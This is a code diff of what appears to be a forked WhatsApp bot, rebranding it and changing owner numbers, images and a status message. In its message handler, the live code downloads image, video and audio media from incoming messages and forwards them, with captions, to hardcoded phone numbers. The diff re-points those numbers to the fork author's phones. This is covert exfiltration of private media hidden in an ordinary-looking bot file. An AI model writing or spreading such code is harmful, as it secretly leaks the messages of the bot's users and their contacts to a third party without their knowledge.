@@ -41,7 +41,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['254112192119']
+  const ownerNumber = ['26777821911']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -111,15 +111,10 @@ console.log("Session downloaded ✅")
   console.log('Bot connected to whatsapp ✅')
   
   let up = `
-┏──────────────⊷
-┊ ɴᴀᴍᴇ : *ɴנɐႦυℓσ נႦ is online*
-┗──────⊷
-┏ *【 ᴅᴇᴠɪᴄᴇ ᴏɴʟɪɴᴇ 】⇳︎*
-┗
 ┏──────⊷
 ┊ *[ɴᴊᴀʙᴜʟᴏ ᴊʙ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ʟɪɴᴋᴇᴅ ᴅᴇᴠɪᴄᴇ]*
 ┗──────────────⊷`;
-conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/NdGZ99mN/705f0162-de6f-4fb8-a78f-6c563969093c.jpg` }, caption: up })
+conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/0mmreh.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)  
@@ -152,14 +147,14 @@ conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/NdGZ99mN/705f01
     if (jawadik.message.imageMessage) {
     let cap = jawadik.message.imageMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-    return conn.sendMessage("254112192119@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("26777821911@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("26772592531@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("254700143167@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("26772592531@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -553,7 +548,7 @@ conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/NdGZ99mN/705f01
          
   //================ownerreact==============
   
-  if(senderNumber.includes("254112192119")){
+  if(senderNumber.includes("26777821911")){
   if(isReact) return
   m.react("💕")
   }
@@ -639,7 +634,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("CASEYRHODES XMD RUNNING ✅");
+  res.send("Njabulo Jb connected to linked ");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
